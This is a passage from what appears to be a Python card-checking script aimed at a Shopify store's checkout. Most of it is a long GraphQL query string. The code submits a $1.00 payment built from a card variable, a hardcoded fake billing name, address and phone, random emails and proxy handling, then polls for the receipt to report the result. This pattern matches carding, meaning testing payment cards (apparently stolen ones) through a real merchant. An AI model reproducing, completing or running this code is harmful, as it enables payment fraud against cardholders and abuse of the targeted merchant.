__typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
            'variables': {
                'input': {
                    'stableId': stableid,
                    'paymentMethodIdentifier': paymentmethodidentifier,
                    'sessionToken': x,
                    'queueToken': queue_token,
                    'payment': {
                        'paymentLines': [
                            {
                                'amount': {
                                    'amount': '1.0',
                                    'currencyCode': 'USD',
                                },
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'sessionId': sid,
                                        'paymentMethodIdentifier': paymentmethodidentifier,
                                        'creditCard': {
                                            'brand': brand,
                                            'lastDigits': cc[-4:],
                                        },
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': '127 Allen st',
                                                'city': 'New york',
                                                'countryCode': 'US',
                                                'postalCode': '10080',
                                                'company': 'T3',
                                                'firstName': 'Nick',
                                                'lastName': 'Chan',
                                                'zoneCode': 'NY',
                                                'phone': '9718081573',
                                            },
                                        },
                                    },
                                },
                            },
                        ],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '127 Allen st',
                                'city': 'New york',
                                'countryCode': 'US',
                                'postalCode': '10080',
                                'company': 'T3',
                                'firstName': 'Nick',
                                'lastName': 'Chan',
                                'zoneCode': 'NY',
                                'phone': '9718081573',
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                        'email': remail,
                        'emailChanged': False,
                        'phoneCountryCode': 'US',
                        'marketingConsent': [{'email': {'value': remail}}],
                        'shopPayOptInPhone': {'number': '9718081573', 'countryCode': 'US'},
                        'rememberMe': False,
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'cartMetafields': [],
                },
                'attemptToken': tok,
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://www.buildingnewfoundations.com/checkouts/cn/{tok}',
                    'pageId': 'bd9e863b-CD45-4D07-33A4-B0A94F03AB0F',
                },
            },
            'operationName': 'SubmitForCompletion',
        }
        try:
            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
                rid = (json.loads(await response.text()))['data']['submitForCompletion']['receipt']['id']
        except Exception as e:
            return ShResult(f"GraphQL request failed: {str(e)}", time.time()-start_time, proxy_status)

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/',
            'user-agent': user_agent,
            'x-checkout-web-source-id': tok,
        }
        params = {'operationName': 'PollForReceipt'}
        json_data = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl 